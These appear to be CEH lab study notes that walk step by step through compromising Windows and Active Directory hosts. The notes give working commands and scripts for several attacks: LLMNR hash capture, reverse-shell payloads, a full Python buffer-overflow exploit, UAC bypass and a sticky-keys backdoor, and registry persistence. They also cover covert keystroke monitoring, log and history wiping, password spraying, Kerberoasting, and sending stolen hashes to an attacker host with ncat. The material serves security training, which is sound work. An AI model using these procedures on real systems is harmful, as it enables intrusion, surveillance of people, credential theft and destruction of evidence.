# System Hacking

exploiting for gaining access to the systems to steal or misuse the data/information

## gaining access, LLMNR NBTNS poisoining

tool used
#### [[Responder]]
#tool/linux 

```bash
sudo responder -I eth0
```
> -I = specifies the interface
> > here eth0 

-> someone has to access the smb service or shared drive in window to capture NTLM hash 
- In windows
```powershell
 \\IP\CEH-Tools
```
 
> by default, responder stores the logs in /usr/share/responder/logs

→ copy the hash of the user and save it in a .txt file
> then we will use [[john]] to crack the hash
```bash
john hash.txt
```
> can be any file name in which the has is been stored


## reverse shell generator

#docker  #gui #tool/linux 

```bash
docker run -d -p 80:80 reverse_shell_generator
```

> if an error pops us `service apache2 stop` → rerun above command

→ firefox → http://localhost
→ IP field → <target-IP'>
→ port 4444
→ create the command in `msfvenom`
→ in the listener tab change the type to `msfconsole`
→ copy both commands and run in separate terminals
→ an .exe file will be created
→ now we need to transfer this .exe file to the target computer
```
	click on places on the file explorer of parrot and click on network and click on edit icon to enter below 
	smb:\\10.10.1.11
	place it in a folder
```
→ as soon as the .exe file runs in the target pc, we will gain access to the computer

we can do the same with other scripts.
next we are using a PowerShell script

→ `Hoaxshell` tab in the reverse shell generator tab
→ select `PowerShell IEX`
→ in this we change the port to `444`
→ copy the payload and save it in a .ps1 file - *this is our payload that we need to run on the target machine*
→ change the listener type to `hoaxshell`

→ in the target pc use PowerShell as admin to run the .ps1 file
``` powershell
	.\shell.ps1
```

## Buffer Overflow (tbc)
---
tools used
#### Immunity Debugger
---
The process needs to be running on the target machine. We need to run the Immunity  debugger as *Admin* on that machine and attach the running process and check it was running on the debugger.

	We can connect with the running process on the target machine using nc on the host machine. Get the commands allowed to be executed on the running process.

	Step1: Spiking
		 It is used to test whether the running process is vulnerable or not. Here 
		
		stats.spk:
		s_readline();
		s_string(“STATS “);
		s_string_variable("0");

		generic_send_tcp 10.10.2.11 44 stats.spk 0 0
	
	Step2: Fuzzing:
		To find the exact bytes where it was breaking
#!/usr/bin/python3
import sys, socket
from time import sleep

buff = b"A" * 100

while True:
    try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.connect(('10.10.1.11', 9999))
        pyload = b'TRUN /.:/' + buff
        soc.send(pyload)
        soc.close()
        sleep(1)
        buff += b"A" * 100
    except:
        print("Fuzzing crashed vulnerable server at %s bytes" % str(len(buff)))
        sys.exit()

	Step3: finding offset:
		
		/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l  10500(output from last step, when server crashed)

		We are able to find the ESP has been overloaded with the values that we have sent and Take the EIP value from the immunity debugger after it was crashed. The output from below will give exact bytes that are required to overwrite.
#!/usr/bin/python3
import sys, socket

offset =b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew"

try:
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect(('10.10.1.11', 9999))
    pyload=b'TRUN /.:/' + offset  
    soc.send(pyload)
    soc.close()
except:
    print("Error: Unable to establish connection with Server")
    sys.exit()

	
		/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10500 -q 396F4338

	Step4: Confirming the Overwrite:
#!/usr/bin/python3
import sys, socket

shellcode = b"A" * 2003 + b"B" * 4
 
try: 
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect(('10.10.1.11', 9999))
    pyload = b'TRUN /.:/' + shellcode
    soc.send(pyload)
    soc.close()
except:
    print("Error: Unable to establish connection with Server")
    sys.exit()

	
	Step 5: Badchars checks

		#!/usr/bin/python3
import sys, socket

badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = b"C" * 2003 + b"D" * 4 + badchars

try:
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect(('10.10.1.11', 9999))
    pyload = b'TRUN /.:/' + shellcode
    soc.send(pyload)
    soc.close()
except:
    print("Error: Unable to establish connection with Server")
    sys.exit()

->In Immunity Debugger, click on the ESP register value in the top-right window. Right-click on the selected ESP register value and click the Follow in Dump option.In the left-corner window, you can observe that there are no badchars that cause problems in the shellcode, as shown in the screenshot.

	Step 6: Finding the right module
	
		Download mona.py and place it in the Immunity debugger installed folders -> pycommands

		In Immunity debugger -> in the search box below -> !mona modules
		Find the module with no memory protection from the table with value set as False


	Step 7: Find  return address of the vulnerable module
	
		JMS ESP  == ffe4
	
		!mona find -s “\xff\xe4” -m essfunc.dll

		Note down the return address

	Step 8: Find If we can able to overwrite the EIP with return address

		import socket

		ip = "127.0.0.1"
		port = 9999

		# Replace with your calculated offset (example: 524)
		offset = 524

		# Replace with the JMP ESP address you found (example: 0x625011AF)
		# Remember to write it in little-endian format
		jmp_esp = "\xAF\x11\x50\x62"

		# Build payload
		payload = "A" * offset
		payload += jmp_esp              # Overwrite EIP with JMP ESP address
		payload += "C" * (1000 - offset - 4)  # Filler

		try:
    		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    		s.connect((ip, port))
    		s.send(payload.encode('latin-1') + b"\r\n")
    		s.close()
   			print(f"Payload of {len(payload)} bytes sent with JMP ESP overwrite")
		except:
    		print("Connection failed")

	Step 9: Exploiting bufferover
	
		msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> EXITFUNC=thread -b "\x00\x0a\x0d" -f c -a x86

		Listen on your localhost:
			nc -lvnp 4444

		BufferOverflow exploit:
			import socket

			ip = "127.0.0.1"
			port = 9999

			# Replace with your calculated offset (example: 524)
			offset = 524

			# Replace with the JMP ESP address you found (little-endian format)
			jmp_esp = "\xAF\x11\x50\x62"   # Example: 0x625011AF

			# NOP sled (helps smooth execution into shellcode)
			nop_sled = "\x90" * 16

			# msfvenom generated shellcode (example reverse TCP, badchars excluded)
			# msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> EXITFUNC=thread -b "\x00\x0a\x0d" -f c
			
			shellcode = (
			"\xdb\xc0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x52\x31\x42\x17..."
			# truncated for brevity — paste full msfvenom output here
			)

			# Build final payload
			payload = "A" * offset
			payload += jmp_esp
			payload += nop_sled
			payload += shellcode

			try:
   				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    		 	s.connect((ip, port))
    		 	s.send(payload.encode('latin-1') + b"\r\n")
    		 	s.close()
    		 	print(f"Payload of {len(payload)} bytes sent")
			except:
    			print("Connection failed")



## Privilege Escalation

2 types
1. horizontal 
2. vertical

tool used 
#### [[Metasploit]]

### By bypassing UAC and Exploiting Sticky Keys

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
```
> here
> > lport (local-port)=444 (change accordingly)
> > lhost (local-host)=10.10.1.13 (change accordingly)
> this creates a reverse shell .exe file payload

```bash
msfconsole
```
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set lhost <10.10.1.13>
```
> change accordingly
```
set lport 444
```
> change accordingly
```
run
```

→ the .exe file when runs on the target machine
→ we get the shell on our terminal
→ perform `sysinfo` and `getuid` - to obtain computer name, OS, domains and current user ID

- background
- search bypassuac
- use exploit/windows/local/bypassuac_fodhelper
- set session 1
- show options
- set LHOST 10.10.1.3
- set TARGET 0
> 0 indicates nothing, but the Exploit Target ID

- exploit
- getsystem -t 1
- getuid
- background
- use post /windows/manage/sticky_keys
- sessions -i*
> lists the sessions in meterpreter

set session 2
exploit

→ login as a non admin account
→ lock the screen
→ press the `shift` button 5 times
→ instead of sticky kets popup, you'll get a cmd prompt
→ whoami
> privilege escalated


### Maintaining remote access

#### spyrix or Refog
#tool/windows  #website 

covert monitoring of user activities in real-time
> can be used to user system monitoring and surveillance

→ install the spyrix on the target machine
→ open the account listed during the setup on a website in the local computer
→ from here u can maintain and monitor your target system
> u can view 
> > 1. live view of the target system
> > 2. keyboard strokes casptured
> > 3. screen shots of the machine taken by spyrix
> > 4. web pages visited by the target
> 
> u can also generate reports directly from the website by clicking `Reports` on the left pane in the dashboard

### persistence by **Modifying Registry Keys**

tool used
#### [[Metasploit]]

```bash
msfconsole -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/test.exe
```
> this is to create a reverse shell .exe payload

```bash
msfconsole -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe
```
> this will create a payload that we'll upload into the run registry  of windows machine

> Below commands is to host the file to download on the target machine

```bash
		mkdir /var/www/html/share
		chmod -R 755 /var/www/html/share
		chown -R www-data:www-data /var/www/html/share
		cp *.exe /var/www/html/share
		service apache2 start

```
```bash
msfconsole
```
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set lhost <10.10.1.13>
```
> change accordingly
```
set lport 444
```
> change accordingly
```
run
```

→ run the test.exe file on target windows machine

- getuid
- background
> in this we will bypass UAC via SilentCleanup task present in the Windows task Scheduler
> present in the metasploit as `bypassuac_silentcleanup`

```
use exploit/windows/local/bypassuac_silentcleanup
```

- set session 1
- show options
- set LHOST 10.10.1.13
- set TARGET 0
> 0 indicates nothing, but the Exploit Target ID

exploit
> if an error occurs saying `Exploit completed, but no sessoin was created` 
> type `exploit` again

getsystem -t 1
getuid
> the meterpreter session is now running with system privileges

→ now we add the registry.exe to the registry to maintain persistent control over the target

```
shell
```
> this will give us a shell on the target machine
> 

in the elevated shell type :
```
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"
```
> once the command is successful
> we need to open a metasploit listener in another tab

```bash
msfconsole
```
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set lhost <10.10.1.13>
```
> change accordingly
```
set lport 4444
```
> change accordingly
```
run
```

→ on windows - restart the machine to place the file in the `Run Registry`
> as soon as the admin logins again with the acc
> we will get the shell on the metasploit listener
> a meterpreter session will be opened

> ```
> getuid
> ```
> results may show that the reverse shell is open with admin privileges


## clearing logs

techniques to clear the evidence of security compromise ⇒
1. disable auditing 
2. clearing logs
3. manipulating logs
4. covering tracks on the network
5. covering tracks on the OS
6. deleting files
7. disabling windows functionality

### clearing windows machine logs

#### Clear_Event_Viewer_Logs.bat --> this uses wevtutil, we need to run this as an admin
#tool/windows 

> it is a utility that can be used to wipe out the logs of target system.
> run through PowerShell

#### [[wevtutil]]
#tool/windows 

> wevtutil is a command-line utility used to retrieve information about event logs and publishers. 
> 
> You can also use this command to 
> > 1. install and uninstall event manifests
> > 2. run queries
> > 3. export, archive, and clear logs.

→ open `cmd` with admin privileges
```
wevtutil el
```
> el OR enum-logs = lists event logs

```
wevtutil cl <log-name>
```
> cl OR clear-log = clears a log\
> log name can be obtained from previous command
> > eg. - application, security, system etc.

#### [[cipher]]
#tool/windows 

> Cipher.exe is an in-built Windows command-line tool that can be used to securely delete a chunk of data by overwriting it to prevent its possible recovery. 
> This command also assists in encrypting and decrypting data in NTFS partitions.
> To avoid data recovery and to cover their tracks, attackers use the Cipher.exe tool to overwrite the deleted files.


```
cipher /w:<drive or folder or file location>
```
> more the size , more the time taken to overwrite

### clearing logs in linux / BASH 

```bash
export HISTSIZE=0
```

> to clear stored history
> ```bash
> history -c
> ```

> to clear the history of the current shell only, leaving other shells untouched
> ```bash
> history -w
> ```

> to shred the history file making it impossible to read

```bash
shred ~/.bash_history
```

or use all the above commands in a single command

```bash
shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit
```
> This command first shreds the history file, then deletes it, and finally clears the evidence of using this command. After this command, you will exit from the terminal window.


## AD attacks using various tools

### scan to identify the DC IP 
DC IP = Domain Controller IP

tool used
#### [[nmap]]

```bash
nmap 10.10.1.0/24
```
> scans the entire network 

> observe the output correctly and look for an IP that has 2 main ports open
> > port 88 / kerberos-sec
> > port 389 / LDAP 
> 
> **the one with both of these open shows that host is the DC**

now scan that host specially
```bash
nmap -sC -A -sV <DC-IP>
```
> this will provide us with the domain name of the system
> > generally located beneath `smb-os-discovery`

### AS-REP Roasting Attack

> Finding accounts with no kerberos preauth required and will request the TGT from DC, TGT will be encrypted by users password hash and will crack the hash to get users password.

```bash
cd impacket/examples
```

```bash
python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22
```
> GetNPUsers.py = script name
> CEH.com = domain name aqcuired in the previous step
> -no-pass = flag to find user accounts not requiring pre-authentication
> -usersfile = /path/to/file with username list
> -dc-ip = ip address of the DC

copy the hash of the user that has **DONT_REQUIRE_PREAUTH**

save it in a file hash.txt

now we crack the hash using [[john]]

```bash
john --wordlist=/root/ADtools/rockyou.txt hash.txt
```
> --wordlist = define the /path/to/filename where the wordlist is stored

### Password Spraying
> From the Nmap results we can observe that other hosts in the subnet are running services such as RDP, SSH, and FTP. Therefore, we can perform password spraying on each service individually to check for correct credentials If the cracked password for one account is “cupcake”, we try to find any users on the AD network that use the same password with RDP enabled.

#### CrackMapExec

```bash
cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
```
> -u = /path/to/file - username wordlist
> -p = password to be sprayed
> rdp = protocol to be targetted

from the list is someone uses the same password itll be cracked and the ip address od the user will be shown
try connecting to the ip address of the machine that uses the same password with RDP
→ open `remmina`
→ fill out the details extracted
→ try to connect to the client

### Post-Enumeration 

#### PowerView

> it is a PowerShell tool designed for network and AD enumeration

→ transfer the PowerView.ps1 file to the target computer
→ to achieve this we can
> host a server and download it on the target computer

here we are hosting a simple [[portable python server]]
```bash
cd /root/ADtools/
python3 -m http.server 80
```
> u can specify the port at the end
> defaults to 8000

In RDP, download the PowerView.ps1 script and run the powershell

go to any browser on the target machine (connected via rdp here during the previous phase)
```
http://10.10.1.13:80
```

→ download the file 
→ open PowerShell 
```
cd Downloads
```
```
PowerShell -EP bypass
```
```
. .\PowerView.ps1
```
> this loads the powerview script in the PowerShell

not we get much more commands to enumerate further

- Get-NetComputer - displays all the information related to computers in AD
- Get-NetGroup - lists all groups in AD
- Get-NetUser - retrieves detailed info about the AD users such as
	- usernames
	- groups
	- memberships

> in the lab we see a user named *SQL_srv* who has some higher privileges
> so we will be attacking this further

more such commands to enumerate are
- Get-NetOU - lists the organizational units 
- Get-NetSession - lists active sessions 
- Get-NetLoggedon - lists user currently logged on
- Get-NetProcess - lists processes running on domain machines
- Get-NetDomainTrust - domain trusts relationships
- Get-NetServices - services running on domain machines
- Get-NetObjectACL - retrieves ACLs for a specified object
- Get-NetSPN - service principal names (SPN) in the domain
- Find-InterestingDomainACL - finds Interesting ACLs 
- Invoke-ShareFinder - find shared folders in the domain
- Invoke-Sharehunter - find where domain admins are logged in
- Invoke-CheckLocalAdminAccess - checks if the current suer has local admin access on specifed machines


### Perform MSSQL attack

> in the previous lab we saw that a user named **SQL_srv** had admin rights and was running sql services
> also the device was located in IP - 10.10.1.30
> has port 1433 open (mssql services)

so we attempt to bruteforce the password 

tool used
#### [[CEH-Tools/hydra]]
#tool/linux 

→ save the name SQL_srv in a .txt file names user.txt
```bash
echo SQL_srv > user.txt
hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
```
> -L = specifies the username list
> -P = specifies the passwords list
> mssql is the service we are attempting to bruteforce
> > here the results show that the password is batman

we try to log into the service
```bash
python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433 
```

> note down the name of the database
> > here `master`

> we will attempt to find out if the [[xp_cmdshell]] is misconfigured or not

execute into the shell obtained from python script
```
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
```
> if this returns 1, it indicates that the xp_cmdshell is enabled on the server

we will now attempt to exploit this xp_cmshell

```bash
msfconsole
```
- use exploit/windows/mssql/mssql_payload
- set RHOST 10.10.1.30
- set USERNAME SQL-srv
- set PASSWORD batman
- set DATABASE master
- exploit

→ after doing all this we get a meterpreter session
```
shell
```
```
whoami
```

### privilege escalation 
#### WinPeas.exe

→ continue in the above shell
> we need to transfer the WinPeas.exe to the targeted machine

```
cd C:\Users\Public\Downloads
```
```
powershell
```

→ host a [[portable python server]] in the `/root/ADtools` directory

in the compromised shell
```
wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe
```
```
./winpeas.exe
```

→ look for an unquoted service
> here we see that a `file.exe` in `C:\Program Files\CEH services` has unquoted and can be exploited

→ in a new terminal
```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe
```

back in the compromised shell
```
cd ../../.. ; cd "Program Files/CEH services"
```
```
move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe
```

in another terminal we will open a netcat listener
```bash
nc -nlvp 8888
```
> port number same as when creating the payload via msfvenom

→ now as soon as the victim *SQL_srv* logs on the computer
→ we will gain its shell

```
whoami
```
> and we can see that we are logged in as the user *SQL_srv*

### Perform Kerberoasting

> Rubeus is a tool for exploiting Kerberos weaknesses in Windows environments. Kerberoasting is a method to extract ticket granting ticket (TGT) hashes from AD. Attackers target service accounts with associated Kerberos service principal names (SPNs). TGTs are requested from the DC for these accounts, then cracked offline to reveal user passwords. Kerberoasting exploits weak service account passwords and the nature of Kerberos authentication.

in the netcat shell obtained in the last attack

```
powershell
```
```
cd ../.. ; cd Users\Public\Downloads
```
 we need to download 2 more executables
```
wget http://10.10.1.13:8000/Rubeus.exe -o rebeus.exe
```
```
wget http://10.10.1.13:8000/ncat.exe -o ncat.exe
```

```
exit
```
```
cd ../.. ; cd Users\Public\Downloads
```

```
rubeus.exe kerberoast /outfile:hash.txt
```
> after kerberoasting the hash of the DC Admin will be saved in hash.txt

now we need to move this hash.txt file to the attacker machine

in another terminal
```
nc -lvp 9999 > hash.txt
```

in the compromised shell
```
ncat.exe -w 3 10.10.1.13 9999 < hash.txt
```

→ in the netcat listener shell press `Enter`
> this will save the hash in the file

now we will crack the hash using [[hashcat]]

```bash
hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt
```

 > -m 13100: This specifies the hash type. 13100 corresponds to Kerberos 5 AS-REQ Pre-Auth etype 23 (RC4-HMAC), a specific format for Kerberos hashes.
 > --force: This option forces Hashcat to ignore warnings and run even if there are compatibility issues. *Use this with caution, as it might cause instability or incorrect results.*
 > -a 0: This specifies the attack mode. 0 stands for a straight attack, which is a simple dictionary attack where Hashcat tries each password in the dictionary as it is.
 > hash.txt: is the input file containing the hashes to crack
 > /root/ADtools/rockyou.txt: is the wordlist file used for the attack
 
